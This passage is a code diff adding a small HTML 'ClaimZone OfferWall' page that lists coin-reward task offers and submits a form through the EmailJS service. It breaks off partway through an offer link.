@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>ClaimZone OfferWall</title>
+  <link rel="stylesheet" href="style.css" />
+  <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+  <script>
+    (function(){
+      emailjs.init("LdeRlI_pU0fx7JFII");
+    })();
+    function sendForm(e) {
+      e.preventDefault();
+      emailjs.sendForm("service_ncwjddj", "template_l3xvvrm", e.target)
+        .then(() => {
+          alert("✅ Submitted! You will be verified soon.");
+          e.target.reset();
+        }, () => {
+          alert("❌ Failed. Try again.");
+        });
+    }
+  </script>
+</head>
+<body>
+  <div class="container">
+    <h1>🎯 ClaimZone Task Offers</h1>
+
+    <div class="offer">
+      <h2>🔥 Amazon MiniTV</h2>
+      <p>Earn 200 Coins</p>
+      <a href="https://play
